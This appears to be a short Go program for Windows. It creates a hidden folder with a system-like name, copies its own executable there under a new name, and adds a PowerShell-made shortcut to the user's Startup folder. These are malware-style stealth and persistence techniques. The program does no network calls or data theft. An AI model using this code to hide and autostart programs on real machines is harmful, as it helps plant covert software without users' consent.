package main

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"syscall"
	"unsafe"
)

var (
	shell32          = syscall.NewLazyDLL("shell32.dll")
	shGetFolderPathA = shell32.NewProc("SHGetFolderPathA")
)

// Make hidden folder
func MakeHiddenFolder(path string) error {
	err := os.MkdirAll(path, 0700)
	if err != nil {
		return err
	}
	return syscall.SetFileAttributes(syscall.StringToUTF16Ptr(path), syscall.FILE_ATTRIBUTE_HIDDEN)
}

// Copy file to destination path
func CopyFile(sourcePath, destPath string) error {
	src, err := os.Open(sourcePath)
	if err != nil {
		return err
	}
	defer src.Close()

	dest, err := os.Create(destPath)
	if err != nil {
		return err
	}
	defer dest.Close()

	_, err = dest.ReadFrom(src)
	return err
}

// Get Startup folder path
func GetStartupFolder() (string, error) {
	var path [syscall.MAX_PATH]byte
	csidlStartup := 0x0007
	r, _, _ := shGetFolderPathA.Call(0, uintptr(csidlStartup), 0, 0, uintptr(unsafe.Pointer(&path[0])))
	if r != 0 {
		return "", fmt.Errorf("SHGetFolderPathA failed")
	}
	return string(path[:strings.IndexByte(string(path[:]), 0)]), nil
}

// Create shortcut using PowerShell
func CreateShortcutToStartup(targetPath, shortcutName string) error {
	startupFolder, err := GetStartupFolder()
	if err != nil {
		return err
	}
	shortcutPath := filepath.Join(startupFolder, shortcutName+".lnk")
	psScript := fmt.Sprintf(`$s=(New-Object -COM WScript.Shell).CreateShortcut('%s');$s.TargetPath='%s';$s.Description='Auto run';$s.Save()`, shortcutPath, targetPath)

	cmd := exec.Command("powershell", "-Command", psScript)
	return cmd.Run()
}

func main() {
	currentDir, err := os.Getwd()
	if err != nil {
		fmt.Println("Failed to get current dir:", err)
		return
	}

	targetFolder := `C:\fake\LINA\Desktop\games\sys64`
	if err := MakeHiddenFolder(targetFolder); err != nil {
		fmt.Println("Failed to create hidden folder:", err)
		return
	}

	// Copy text files
	textFiles := []string{"hello.txt", "hello2.txt", "hello3.txt"}
	for _, file := range textFiles {
		src := filepath.Join(currentDir, file)
		dest := filepath.Join(targetFolder, file)
		if err := CopyFile(src, dest); err != nil {
			fmt.Println("Failed to copy", file, ":", err)
		}
	}

	// Rename main.exe to nobelrun.exe in target folder
	mainSrc := filepath.Join(currentDir, "main.exe")
	nobelDest := filepath.Join(targetFolder, "nobelrun.exe")
	if err := CopyFile(mainSrc, nobelDest); err != nil {
		fmt.Println("Failed to copy/rename main.exe:", err)
		return
	}

	// Create shortcut
	if err := CreateShortcutToStartup(nobelDest, "nobelrunner"); err != nil {
		fmt.Println("Failed to create startup shortcut:", err)
		return
	}

	fmt.Println("Done.")
}
